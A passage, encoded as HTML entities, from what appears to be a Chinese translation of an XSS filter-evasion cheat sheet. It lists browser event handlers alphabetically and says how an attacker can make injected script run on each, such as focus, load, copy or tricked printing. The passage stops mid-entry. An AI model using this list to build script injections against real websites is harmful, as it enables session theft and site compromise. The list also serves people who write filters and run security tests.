&#xFF08;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x5728;&#x5D4C;&#x5165;&#x5F0F;Flash&#x5BF9;&#x8C61;&#x4E2D;&#x6267;&#x884C;&#x65F6;&#x4F7F;&#x7528;&#x6B64;&#x529F;&#x80FD;&#xFF09; onAbort() &#xFF08;&#x5F53;&#x7528;&#x6237;&#x4E2D;&#x6B62;&#x52A0;&#x8F7D;&#x56FE;&#x50CF;&#x65F6;&#xFF09; onActivate() &#xFF08;&#x5F53;&#x5BF9;&#x8C61;&#x8BBE;&#x7F6E;&#x4E3A;&#x6D3B;&#x52A8;&#x5143;&#x7D20;&#x65F6;&#xFF09; onAfterPrint() &#xFF08;&#x5728;&#x7528;&#x6237;&#x6253;&#x5370;&#x6216;&#x9884;&#x89C8;&#x6253;&#x5370;&#x4F5C;&#x4E1A;&#x540E;&#x6FC0;&#x6D3B;&#xFF09; onAfterUpdate() &#xFF08;&#x5728;&#x66F4;&#x65B0;&#x6E90;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x540E;&#x6FC0;&#x6D3B;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#xFF09; onBeforeActivate() &#xFF08;&#x5728;&#x5C06;&#x5BF9;&#x8C61;&#x8BBE;&#x7F6E;&#x4E3A;&#x6D3B;&#x52A8;&#x5143;&#x7D20;&#x4E4B;&#x524D;&#x89E6;&#x53D1;&#xFF09; onBeforeCopy() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x5728;&#x9009;&#x62E9;&#x590D;&#x5236;&#x5230;&#x526A;&#x8D34;&#x677F;&#x4E4B;&#x524D;&#x6267;&#x884C;&#x653B;&#x51FB;&#x5B57;&#x7B26;&#x4E32; - &#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8BE5;execCommand(&#x201C;Copy&#x201D;)&#x529F;&#x80FD;&#x6267;&#x884C;&#x6B64;&#x64CD;&#x4F5C;&#xFF09; onBeforeCut() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x5728;&#x5207;&#x6362;&#x9009;&#x62E9;&#x4E4B;&#x524D;&#x6267;&#x884C;&#x653B;&#x51FB;&#x5B57;&#x7B26;&#x4E32;&#xFF09; onBeforeDeactivate() &#xFF08;&#x4ECE;&#x5F53;&#x524D;&#x5BF9;&#x8C61;&#x66F4;&#x6539;activeElement&#x540E;&#x7ACB;&#x5373;&#x89E6;&#x53D1;&#xFF09; onBeforeEditFocus() &#xFF08;&#x5728;&#x53EF;&#x7F16;&#x8F91;&#x5143;&#x7D20;&#x4E2D;&#x5305;&#x542B;&#x7684;&#x5BF9;&#x8C61;&#x8FDB;&#x5165;UI&#x6FC0;&#x6D3B;&#x72B6;&#x6001;&#x6216;&#x9009;&#x62E9;&#x53EF;&#x7F16;&#x8F91;&#x5BB9;&#x5668;&#x5BF9;&#x8C61;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onBeforePaste() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x88AB;&#x6B3A;&#x9A97;&#x7C98;&#x8D34;&#x6216;&#x4F7F;&#x7528;&#x8BE5;execCommand(&#x201C;Paste&#x201D;)&#x529F;&#x80FD;&#x5F3A;&#x5236;&#x8FDB;&#x5165;&#xFF09; onBeforePrint() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x88AB;&#x6B3A;&#x9A97;&#x6253;&#x5370;&#x6216;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;print()&#x6216;execCommand(&#x201C;Print&#x201D;)&#x529F;&#x80FD;&#xFF09;&#x3002; onBeforeUnload() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x88AB;&#x6B3A;&#x9A97;&#x5173;&#x95ED;&#x6D4F;&#x89C8;&#x5668; - &#x653B;&#x51FB;&#x8005;&#x65E0;&#x6CD5;&#x5378;&#x8F7D;&#x7A97;&#x53E3;&#xFF0C;&#x9664;&#x975E;&#x5B83;&#x662F;&#x4ECE;&#x7236;&#x7EA7;&#x751F;&#x6210;&#x7684;&#xFF09; onBeforeUpdate() &#xFF08;&#x5728;&#x66F4;&#x65B0;&#x6E90;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E4B;&#x524D;&#x6FC0;&#x6D3B;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#xFF09; onBegin() &#xFF08;&#x5F53;&#x5143;&#x7D20;&#x7684;&#x65F6;&#x95F4;&#x8F74;&#x5F00;&#x59CB;&#x65F6;&#xFF0C;onbegin&#x4E8B;&#x4EF6;&#x7ACB;&#x5373;&#x89E6;&#x53D1;&#xFF09; onBlur() &#xFF08;&#x5728;&#x52A0;&#x8F7D;&#x53E6;&#x4E00;&#x4E2A;&#x5F39;&#x51FA;&#x7A97;&#x53E3;&#x4E14;&#x7A97;&#x53E3;&#x5931;&#x53BB;&#x7126;&#x70B9;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF09; onBounce() &#xFF08;&#x5F53;marquee&#x5BF9;&#x8C61;&#x7684;behavior&#x5C5E;&#x6027;&#x8BBE;&#x7F6E;&#x4E3A;&#x201C;alternate&#x201D;&#x5E76;&#x4E14;&#x9009;&#x53D6;&#x6846;&#x7684;&#x5185;&#x5BB9;&#x5230;&#x8FBE;&#x7A97;&#x53E3;&#x7684;&#x4E00;&#x4FA7;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onCellChange() &#xFF08;&#x6570;&#x636E;&#x63D0;&#x4F9B;&#x8005;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x66F4;&#x6539;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onChange() &#xFF08;select&#xFF0C;text&#x6216;TEXTAREA&#x5B57;&#x6BB5;&#x5931;&#x53BB;&#x7126;&#x70B9;&#xFF0C;&#x5176;&#x503C;&#x5DF2;&#x88AB;&#x4FEE;&#x6539;&#xFF09; onClick() &#xFF08;&#x6709;&#x4EBA;&#x70B9;&#x51FB;&#x8868;&#x683C;&#xFF09; onContextMenu() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x53F3;&#x952E;&#x70B9;&#x51FB;&#x653B;&#x51FB;&#x533A;&#x57DF;&#xFF09; onControlSelect() &#xFF08;&#x5F53;&#x7528;&#x6237;&#x5373;&#x5C06;&#x5BF9;&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x63A7;&#x5236;&#x9009;&#x62E9;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onCopy() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x590D;&#x5236;&#x67D0;&#x4E9B;&#x4E1C;&#x897F;&#x6216;&#x8005;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8BE5;execCommand(&#x201C;Copy&#x201D;)&#x547D;&#x4EE4;&#x6765;&#x5229;&#x7528;&#x5B83;&#xFF09; onCut() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x590D;&#x5236;&#x67D0;&#x4E9B;&#x4E1C;&#x897F;&#x6216;&#x8005;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8BE5;execCommand(&#x201C;Cut&#x201D;)&#x547D;&#x4EE4;&#x6765;&#x5229;&#x7528;&#x5B83;&#xFF09; onDataAvailable() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x66F4;&#x6539;&#x5143;&#x7D20;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5426;&#x5219;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x529F;&#x80FD;&#xFF09; onDataSetChanged() &#xFF08;&#x5F53;&#x6570;&#x636E;&#x6E90;&#x5BF9;&#x8C61;&#x516C;&#x5F00;&#x7684;&#x6570;&#x636E;&#x96C6;&#x53D1;&#x751F;&#x66F4;&#x6539;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onDataSetComplete() &#xFF08;&#x89E6;&#x53D1;&#x8868;&#x793A;&#x6240;&#x6709;&#x6570;&#x636E;&#x90FD;&#x53EF;&#x4ECE;&#x6570;&#x636E;&#x6E90;&#x5BF9;&#x8C61;&#x83B7;&#x5F97;&#xFF09; onDblClick() &#xFF08;&#x7528;&#x6237;&#x53CC;&#x51FB;&#x8868;&#x5355;&#x5143;&#x7D20;&#x6216;&#x94FE;&#x63A5;&#xFF09; onDeactivate() &#xFF08;&#x5F53;activeElement&#x4ECE;&#x5F53;&#x524D;&#x5BF9;&#x8C61;&#x66F4;&#x6539;&#x4E3A;&#x7236;&#x6587;&#x6863;&#x4E2D;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onDrag() &#xFF08;&#x8981;&#x6C42;&#x7528;&#x6237;&#x62D6;&#x52A8;&#x5BF9;&#x8C61;&#xFF09; onDragEnd() &#xFF08;&#x8981;&#x6C42;&#x7528;&#x6237;&#x62D6;&#x52A8;&#x5BF9;&#x8C61;&#xFF09; onDragLeave() &#xFF08;&#x8981;&#x6C42;&#x7528;&#x6237;&#x5C06;&#x5BF9;&#x8C61;&#x62D6;&#x51FA;&#x6709;&#x6548;&#x4F4D;&#x7F6E;&#xFF09; onDragEnter() &#xFF08;&#x8981;&#x6C42;&#x7528;&#x6237;&#x5C06;&#x5BF9;&#x8C61;&#x62D6;&#x52A8;&#x5230;&#x6709;&#x6548;&#x4F4D;&#x7F6E;&#xFF09; onDragOver() &#xFF08;&#x8981;&#x6C42;&#x7528;&#x6237;&#x5C06;&#x5BF9;&#x8C61;&#x62D6;&#x52A8;&#x5230;&#x6709;&#x6548;&#x4F4D;&#x7F6E;&#xFF09; onDragDrop() &#xFF08;&#x7528;&#x6237;&#x5C06;&#x5BF9;&#x8C61;&#xFF08;&#x4F8B;&#x5982;&#x6587;&#x4EF6;&#xFF09;&#x653E;&#x5230;&#x6D4F;&#x89C8;&#x5668;&#x7A97;&#x53E3;&#x4E2D;&#xFF09; onDragStart() &#xFF08;&#x5F53;&#x7528;&#x6237;&#x5F00;&#x59CB;&#x62D6;&#x52A8;&#x64CD;&#x4F5C;&#x65F6;&#x53D1;&#x751F;&#xFF09; onDrop() &#xFF08;&#x7528;&#x6237;&#x5C06;&#x5BF9;&#x8C61;&#xFF08;&#x4F8B;&#x5982;&#x6587;&#x4EF6;&#xFF09;&#x653E;&#x5230;&#x6D4F;&#x89C8;&#x5668;&#x7A97;&#x53E3;&#x4E2D;&#xFF09; onEnd() &#xFF08;&#x5F53;&#x65F6;&#x95F4;&#x7EBF;&#x7ED3;&#x675F;&#x65F6;&#xFF0C;onEnd&#x4E8B;&#x4EF6;&#x5C06;&#x89E6;&#x53D1;&#x3002; onError() &#xFF08;&#x52A0;&#x8F7D;&#x6587;&#x6863;&#x6216;&#x56FE;&#x50CF;&#x4F1A;&#x5BFC;&#x81F4;&#x9519;&#x8BEF;&#xFF09; onErrorUpdate() &#xFF08;&#x5728;&#x66F4;&#x65B0;&#x6570;&#x636E;&#x6E90;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x5173;&#x8054;&#x6570;&#x636E;&#x65F6;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x65F6;&#x5728;&#x6570;&#x636E;&#x7ED1;&#x5B9A;&#x5BF9;&#x8C61;&#x4E0A;&#x89E6;&#x53D1;&#xFF09; onFilterChange() &#xFF08;&#x5F53;&#x53EF;&#x89C6;&#x8FC7;&#x6EE4;&#x5668;&#x5B8C;&#x6210;&#x72B6;&#x6001;&#x66F4;&#x6539;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onFinish() &#xFF08;&#x5F53;marquee&#x5B8C;&#x6210;&#x5FAA;&#x73AF;&#x65F6;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x6F0F;&#x6D1E;&#xFF09; onFocus() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x5728;&#x7A97;&#x53E3;&#x83B7;&#x5F97;&#x7126;&#x70B9;&#x65F6;&#x6267;&#x884C;&#x653B;&#x51FB;&#x5B57;&#x7B26;&#x4E32;&#xFF09; onFocusIn() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x5728;&#x7A97;&#x53E3;&#x83B7;&#x5F97;&#x7126;&#x70B9;&#x65F6;&#x6267;&#x884C;&#x653B;&#x51FB;&#x5B57;&#x7B26;&#x4E32;&#xFF09; onFocusOut() &#xFF08;&#x5F53;&#x7A97;&#x53E3;&#x5931;&#x53BB;&#x7126;&#x70B9;&#x65F6;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x6267;&#x884C;&#x653B;&#x51FB;&#x5B57;&#x7B26;&#x4E32;&#xFF09; onHashChange() &#xFF08;&#x5F53;&#x6587;&#x6863;&#x5F53;&#x524D;&#x5730;&#x5740;&#x7684;&#x7247;&#x6BB5;&#x6807;&#x8BC6;&#x7B26;&#x90E8;&#x5206;&#x53D1;&#x751F;&#x66F4;&#x6539;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onHelp() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x5728;&#x7A97;&#x53E3;&#x805A;&#x7126;&#x65F6;&#x7528;&#x6237;&#x70B9;&#x51FB;F1&#x65F6;&#x6267;&#x884C;&#x653B;&#x51FB;&#x5B57;&#x7B26;&#x4E32;&#xFF09; onInput() &#xFF08;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x754C;&#x9762;&#x66F4;&#x6539;&#x5143;&#x7D20;&#x7684;&#x6587;&#x672C;&#x5185;&#x5BB9;&#xFF09; onKeyDown() &#xFF08;&#x7528;&#x6237;&#x6309;&#x4E0B;&#x4E00;&#x4E2A;&#x952E;&#xFF09; onKeyPress() &#xFF08;&#x7528;&#x6237;&#x6309;&#x4E0B;&#x6216;&#x6309;&#x4F4F;&#x952E;&#xFF09; onKeyUp() &#xFF08;&#x7528;&#x6237;&#x53D1;&#x5E03;&#x5BC6;&#x94A5;&#xFF09; onLayoutComplete() &#xFF08;&#x7528;&#x6237;&#x5FC5;&#x987B;&#x6253;&#x5370;&#x6216;&#x6253;&#x5370;&#x9884;&#x89C8;&#xFF09; onLoad() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x5728;&#x7A97;&#x53E3;&#x52A0;&#x8F7D;&#x540E;&#x6267;&#x884C;&#x653B;&#x51FB;&#x5B57;&#x7B26;&#x4E32;&#xFF09; onLoseCapture() &#xFF08;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BE5;releaseCapture()&#x65B9;&#x6CD5;&#x5229;&#x7528;&#xFF09; onMediaComplete() &#xFF08;&#x5F53;&#x4F7F;&#x7528;&#x6D41;&#x5A92;&#x4F53;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x6B64;&#x4E8B;&#x4EF6;&#x53EF;&#x80FD;&#x4F1A;&#x5728;&#x6587;&#x4EF6;&#x5F00;&#x59CB;&#x64AD;&#x653E;&#x4E4B;&#x524D;&#x89E6;&#x53D1;&#xFF09; onMediaError() &#xFF08;&#x7528;&#x6237;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x6253;&#x5F00;&#x5305;&#x542B;&#x5A92;&#x4F53;&#x6587;&#x4EF6;&#x7684;&#x9875;&#x9762;&#xFF0C;&#x5E76;&#x5728;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x65F6;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#xFF09; onMessage() &#xFF08;&#x6587;&#x4EF6;&#x6536;&#x5230;&#x6D88;&#x606F;&#x65F6;&#x5F00;&#x706B;&#xFF09; onMouseDown() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x8BA9;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x56FE;&#x50CF;&#xFF09; onMouseEnter() &#xFF08;&#x5149;&#x6807;&#x5728;&#x5BF9;&#x8C61;&#x6216;&#x533A;&#x57DF;&#x4E0A;&#x79FB;&#x52A8;&#xFF09; onMouseLeave() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x8BA9;&#x7528;&#x6237;&#x5C06;&#x9F20;&#x6807;&#x60AC;&#x505C;&#x5728;&#x56FE;&#x50CF;&#x6216;&#x8868;&#x683C;&#x4E0A;&#x7136;&#x540E;&#x518D;&#x5173;&#x95ED;&#xFF09; onMouseMove() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x8BA9;&#x7528;&#x6237;&#x5C06;&#x9F20;&#x6807;&#x60AC;&#x505C;&#x5728;&#x56FE;&#x50CF;&#x6216;&#x8868;&#x683C;&#x4E0A;&#xFF09; onMouseOut() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x8BA9;&#x7528;&#x6237;&#x5C06;&#x9F20;&#x6807;&#x60AC;&#x505C;&#x5728;&#x56FE;&#x50CF;&#x6216;&#x8868;&#x683C;&#x4E0A;&#x7136;&#x540E;&#x518D;&#x5173;&#x95ED;&#xFF09; onMouseOver() &#xFF08;&#x5149;&#x6807;&#x5728;&#x5BF9;&#x8C61;&#x6216;&#x533A;&#x57DF;&#x4E0A;&#x79FB;&#x52A8;&#xFF09; onMouseUp() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x8BA9;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x56FE;&#x50CF;&#xFF09; onMouseWheel() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x8BA9;&#x7528;&#x6237;&#x4F7F;&#x7528;&#x4ED6;&#x4EEC;&#x7684;&#x9F20;&#x6807;&#x6EDA;&#x8F6E;&#xFF09; onMove() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x4F1A;&#x79FB;&#x52A8;&#x9875;&#x9762;&#xFF09; onMoveEnd() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x4F1A;&#x79FB;&#x52A8;&#x9875;&#x9762;&#xFF09; onMoveStart() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x4F1A;&#x79FB;&#x52A8;&#x9875;&#x9762;&#xFF09; onOffline() &#xFF08;&#x5982;&#x679C;&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x5728;&#x7EBF;&#x6A21;&#x5F0F;&#x4E0B;&#x5DE5;&#x4F5C;&#x5E76;&#x4E14;&#x5B83;&#x5F00;&#x59CB;&#x8131;&#x673A;&#x5DE5;&#x4F5C;&#xFF0C;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#xFF09; onOnline() &#xFF08;&#x5982;&#x679C;&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x79BB;&#x7EBF;&#x6A21;&#x5F0F;&#x4E0B;&#x5DE5;&#x4F5C;&#x5E76;&#x4E14;&#x5B83;&#x5F00;&#x59CB;&#x5728;&#x7EBF;&#x5DE5;&#x4F5C;&#xFF0C;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#xFF09; onOutOfSync() &#xFF08;&#x4E2D;&#x65AD;&#x5143;&#x7D20;&#x64AD;&#x653E;&#x65F6;&#x95F4;&#x8F74;&#x5B9A;&#x4E49;&#x7684;&#x5A92;&#x4F53;&#x7684;&#x80FD;&#x529B;&#xFF09; onPaste() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x7C98;&#x8D34;&#x6216;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8BE5;execCommand(&#x201C;Paste&#x201D;)&#x529F;&#x80FD;&#xFF09; onPause() &#xFF08;onpause&#x4E8B;&#x4EF6;&#x89E6;&#x53D1;&#x65F6;&#x95F4;&#x7EBF;&#x6682;&#x505C;&#x65F6;&#x6D3B;&#x52A8;&#x7684;&#x6BCF;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x5305;&#x62EC;body&#x5143;&#x7D20;&#xFF09; onPopState() &#xFF08;&#x7528;&#x6237;&#x5BFC;&#x822A;&#x4F1A;&#x8BDD;&#x5386;&#x53F2;&#x8BB0;&#x5F55;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onProgress() &#xFF08;&#x653B;&#x51FB;&#x8005;&#x4F1A;&#x4F7F;&#x7528;&#x6B64;&#x4F5C;&#x4E3A;flash&#x7535;&#x5F71;&#x52A0;&#x8F7D;&#xFF09; onPropertyChange() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x66F4;&#x6539;&#x5143;&#x7D20;&#x5C5E;&#x6027;&#xFF09; onReadyStateChange() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x66F4;&#x6539;&#x5143;&#x7D20;&#x5C5E;&#x6027;&#xFF09; onRedo() &#xFF08;&#x7528;&#x6237;&#x5728;&#x64A4;&#x6D88;&#x4E8B;&#x52A1;&#x5386;&#x53F2;&#x8BB0;&#x5F55;&#x4E2D;&#x524D;&#x8FDB;&#xFF09; onRepeat() &#xFF08;&#x6BCF;&#x6B21;&#x91CD;&#x590D;&#x65F6;&#x95F4;&#x7EBF;&#x65F6;&#xFF0C;&#x4E8B;&#x4EF6;&#x90FD;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x6B21;&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x7B2C;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x5468;&#x671F;&#xFF09; onReset() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x91CD;&#x7F6E;&#x8868;&#x5355;&#xFF09; onResize() &#xFF08;&#x7528;&#x6237;&#x5C06;&#x8C03;&#x6574;&#x7A97;&#x53E3;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x4E0E;&#x50CF;&#x521D;&#x59CB;&#x5316;&#xFF1A;self.resizeTo(500,400);&#xFF09; onResizeEnd() &#xFF08;&#x7528;&#x6237;&#x5C06;&#x8C03;&#x6574;&#x7A97;&#x53E3;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x4E0E;&#x50CF;&#x521D;&#x59CB;&#x5316;&#xFF1A;self.resizeTo(500,400);&#xFF09; onResizeStart() &#xFF08;&#x7528;&#x6237;&#x5C06;&#x8C03;&#x6574;&#x7A97;&#x53E3;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x4E0E;&#x50CF;&#x521D;&#x59CB;&#x5316;&#xFF1A;self.resizeTo(500,400);&#xFF09; onResume() &#xFF08;onresume&#x4E8B;&#x4EF6;&#x89E6;&#x53D1;&#x65F6;&#x95F4;&#x7EBF;&#x6062;&#x590D;&#x65F6;&#x53D8;&#x4E3A;&#x6D3B;&#x52A8;&#x7684;&#x6BCF;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x5305;&#x62EC;body&#x5143;&#x7D20;&#xFF09; onReverse() &#xFF08;&#x5982;&#x679C;&#x5143;&#x7D20;&#x7684;repeatCount&#x5927;&#x4E8E;1&#xFF0C;&#x5219;&#x6BCF;&#x6B21;&#x65F6;&#x95F4;&#x8F74;&#x5F00;&#x59CB;&#x5411;&#x540E;&#x64AD;&#x653E;&#x65F6;&#x90FD;&#x4F1A;&#x89E6;&#x53D1;&#x6B64;&#x4E8B;&#x4EF6;&#xFF09; onRowsEnter() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x66F4;&#x6539;&#x6570;&#x636E;&#x6E90;&#x4E2D;&#x7684;&#x884C;&#xFF09; onRowExit() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x66F4;&#x6539;&#x6570;&#x636E;&#x6E90;&#x4E2D;&#x7684;&#x884C;&#xFF09; onRowDelete() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x5220;&#x9664;&#x6570;&#x636E;&#x6E90;&#x4E2D;&#x7684;&#x884C;&#xFF09; onRowInserted() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x5728;&#x6570;&#x636E;&#x6E90;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x884C;&#xFF09; onScroll() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x6EDA;&#x52A8;&#xFF0C;&#x5426;&#x5219;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8BE5;scrollBy()&#x529F;&#x80FD;&#xFF09; onSeek() &#xFF08;&#x5F53;&#x65F6;&#x95F4;&#x8F74;&#x8BBE;&#x7F6E;&#x4E3A;&#x5411;&#x524D;&#x4EE5;&#x5916;&#x7684;&#x4EFB;&#x4F55;&#x65B9;&#x5411;&#x64AD;&#x653E;&#x65F6;&#xFF0C;onreverse&#x4E8B;&#x4EF6;&#x5C06;&#x89E6;&#x53D1;&#xFF09; onSelect() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x9009;&#x62E9;&#x4E00;&#x4E9B;&#x6587;&#x672C;-&#x653B;&#x51FB;&#x8005;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x4E0E;&#x50CF;&#x521D;&#x59CB;&#x5316;&#xFF1A;window.document.execCommand(&#x201C;SelectAll&#x201D;);&#xFF09; onSelectionChange() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x9009;&#x62E9;&#x4E00;&#x4E9B;&#x6587;&#x672C;-&#x653B;&#x51FB;&#x8005;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x4E0E;&#x50CF;&#x521D;&#x59CB;&#x5316;&#xFF1A;window.document.execCommand(&#x201C;SelectAll&#x201D;);&#xFF09; onSelectStart() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x9009;&#x62E9;&#x4E00;&#x4E9B;&#x6587;&#x672C;-&#x653B;&#x51FB;&#x8005;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x4E0E;&#x50CF;&#x521D;&#x59CB;&#x5316;&#xFF1A;window.document.execCommand(&#x201C;SelectAll&#x201D;);&#xFF09; onStart() &#xFF08;&#x5728;&#x6BCF;&#x4E2A;&#x9009;&#x6846;&#x5FAA;&#x73AF;&#x5F00;&#x59CB;&#x65F6;&#x89E6;&#x53D1;&#xFF09; onStop() &#xFF08;&#x7528;&#x6237;&#x9700;&#x8981;&#x6309;&#x505C;&#x6B62;&#x6309;&#x94AE;&#x6216;&#x79BB;&#x5F00;&#x7F51;&#x9875;&#xFF09; onStorage() &#xFF08;&#x5B58;&#x50A8;&#x533A;&#x57DF;&#x6539;&#x53D8;&#x4E86;&#xFF09; onSyncRestored() &#xFF08;&#x7528;&#x6237;&#x4E2D;&#x65AD;&#x5143;&#x7D20;&#x64AD;&#x653E;&#x5176;&#x64AD;&#x653E;&#x65F6;&#x95F4;&#x8F74;&#x6240;&#x5B9A;&#x4E49;&#x7684;&#x5A92;&#x4F53;&#x7684;&#x80FD;&#x529B;&#xFF09; onSubmit() &#xFF08;&#x8981;&#x6C42;&#x653B;&#x51FB;&#x8005;&#x6216;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x8868;&#x5355;&#xFF09; onTimeError() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x5C06;&#x65F6;&#x95F4;&#x5C5E;&#x6027;&#xFF08;&#x5982;dur&#xFF09;&#x8BBE;&#x7F6E;&#x4E3A;&#x65E0;&#x6548;&#x503C;&#xFF09; onTrackChange() &#xFF08;&#x7528;&#x6237;&#x6216;&#x653B;&#x51FB;&#x8005;&#x66F4;&#x6539;&#x64AD;&#x653E;&#x5217;&#x8868;&#x4E2D;&#x7684;&#x66F2;&#x76EE;&#xFF09; onUndo() &#xFF08;&#x7528;&#x6237;&#x5728;&#x64A4;&#x6D88;&#x4E8B;&#x52A1;&#x5386;&#x53F2;&#x8BB0;&#x5F55;&#x4E2D;&#x540E;&#x9000;&#xFF09; onUnload() &#xFF08;&#x5F53;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x4EFB;&#x4F55;&#x94FE;&#x63A5;&#x6216;&#x6309;&#x4E0B;&#x540E;&#x9000;&#x6309;&#x94AE;&#x6216;&#x653B;&#x51FB;&#x8005;&#x5F3A;&#x5236;&#x70B9;&#x51FB;&#x65F6;&#xFF09; onURLFlip() &#xFF08;&#x5F53;&#x7531;HTML + 